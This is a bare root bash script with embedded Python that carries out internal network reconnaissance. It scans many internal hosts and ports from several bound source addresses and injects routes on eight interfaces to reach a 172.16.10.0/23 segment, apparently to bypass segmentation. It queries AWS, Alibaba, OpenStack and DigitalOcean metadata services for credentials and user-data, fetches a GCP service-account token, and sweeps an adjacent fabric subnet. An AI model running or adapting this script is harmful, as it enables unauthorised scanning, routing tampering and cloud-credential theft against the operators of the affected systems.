#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "$@"; }
log "### ID $(hostname) $(date -u +%FT%TZ)"
mkdir -p /root/ul_farmfan

cat > /root/ul_farmfan/probe.py <<'PY'
import socket,sys,concurrent.futures,json
srcs=["192.168.0.23","11.9.141.130","11.9.141.146","11.9.141.162","11.9.141.178",
      "11.9.141.194","11.9.141.210","11.9.141.226","11.9.141.242"]
tgts=["172.16.10.1","172.16.10.2","172.16.10.10","172.16.10.71","172.16.10.254",
      "172.16.11.1","172.16.11.2","172.16.11.13","172.16.11.18","172.16.11.254",
      "172.16.99.1","192.168.0.1"]
ports=[22,11398,9400,443]
def one(a):
    src,dst,p=a
    s=socket.socket(); s.settimeout(1.2)
    try:
        s.bind((src,0))
        r=s.connect_ex((dst,p))
    except Exception as e:
        r=-1
    s.close()
    return (src,dst,p,r)
jobs=[(s,d,p) for s in srcs for d in tgts for p in ports]
res={}
with concurrent.futures.ThreadPoolExecutor(max_workers=120) as ex:
    for src,dst,p,r in ex.map(one,jobs):
        if r==0: print("OPEN",src,dst,p,flush=True)
        elif r not in (101,111,113): print("st",r,src,dst,p,flush=True)
print("PROBE_DONE")
PY
log "### P1-MATRIX"; timeout 180 python3 /root/ul_farmfan/probe.py 2>&1 | tail -80

log "### P2-ROUTEINJECT"
for pair in "eth2 11.9.141.129 11.9.141.130" "eth3 11.9.141.145 11.9.141.146" "eth4 11.9.141.161 11.9.141.162" "eth5 11.9.141.177 11.9.141.178" "eth6 11.9.141.193 11.9.141.194" "eth7 11.9.141.209 11.9.141.210" "eth8 11.9.141.225 11.9.141.226" "eth9 11.9.141.241 11.9.141.242"; do
  set -- $pair; IF=$1; GW=$2; SRC=$3
  for MODE in via onlink; do
    if [ "$MODE" = via ]; then ip route replace 172.16.10.0/23 via $GW dev $IF src $SRC 2>&1; else ip route replace 172.16.10.0/23 dev $IF src $SRC 2>&1; fi
    echo "--- route $MODE $IF"; ip route get 172.16.10.1 from $SRC 2>&1 | head -2
    python3 - "$SRC" <<'PY'
import socket,sys
src=sys.argv[1]
for dst in ["172.16.10.1","172.16.10.71","172.16.11.13","172.16.11.1"]:
  for p in (22,11398,9400):
    s=socket.socket(); s.settimeout(1.2)
    try:
      s.bind((src,0)); r=s.connect_ex((dst,p))
    except Exception: r=-1
    s.close()
    if r==0: print("OPEN",src,dst,p,flush=True)
PY
    ip route del 172.16.10.0/23 dev $IF 2>/dev/null
  done
done
ip route flush cache 2>/dev/null
log "### P2-NEGCTL"
python3 - <<'PY'
import socket
for dst in ["172.16.99.1","172.16.99.55"]:
  s=socket.socket(); s.settimeout(1.5)
  try: r=s.connect_ex((dst,22))
  except Exception: r=-1
  s.close(); print("NEG",dst,22,r)
PY

log "### P3-IMDS"
for u in "http://169.254.169.254/latest/meta-data/" "http://169.254.169.254/latest/meta-data/instance-id" "http://169.254.169.254/latest/meta-data/hostname" "http://169.254.169.254/latest/meta-data/ram/security-credentials/" "http://169.254.169.254/latest/user-data" "http://169.254.169.254/openstack/latest/meta_data.json" "http://100.100.100.200/latest/meta-data/" "http://100.100.100.200/latest/meta-data/ram/security-credentials/" "http://169.254.169.254/metadata/v1/"; do
  echo "--- $u"; curl -s -m 5 --noproxy '*' "$u" 2>&1 | head -20; echo
done
echo "--- gcp"; curl -s -m 5 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 2>&1 | head -5
echo "--- aws-iam"; curl -s -m 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -5

log "### P4-FABRIC-SWEEP"
cat > /root/ul_farmfan/fab.py <<'PY'
import socket,concurrent.futures
subs=[(".128",".130"),(".144",".146"),(".160",".162"),(".176",".178"),(".192",".194"),(".208",".210"),(".224",".226"),(".240",".242")]
jobs=[]
for s,src in subs:
    base="11.9.141."
    for i in range(128,144):
        pass
for src in ["11.9.141.130","11.9.141.146","11.9.141.162","11.9.141.178","11.9.141.194","11.9.141.210","11.9.141.226","11.9.141.242"]:
    pref=src.rsplit('.',1)[0]+"."
    lo=int(src.rsplit('.',1)[1])//16*16
    for h in range(lo+1,lo+16):
        d=pref+str(h)
        if d==src: continue
        for p in (22,9400,11398):
            jobs.append((src,d,p))
def one(a):
    src,dst,p=a
    s=socket.socket(); s.settimeout(0.6)
    try:
        s.bind((src,0)); r=s.connect_ex((dst,p))
    except Exception: r=-1
    s.close(); return (src,dst,p,r)
with concurrent.futures.ThreadPoolExecutor(max_workers=150) as ex:
    for src,dst,p,r in ex.map(one,jobs):
        if r==0: print("FABOPEN",src,dst,p,flush=True)
print("FAB_DONE")
PY
timeout 200 python3 /root/ul_farmfan/fab.py 2>&1 | tail -40

log "### DONE2"
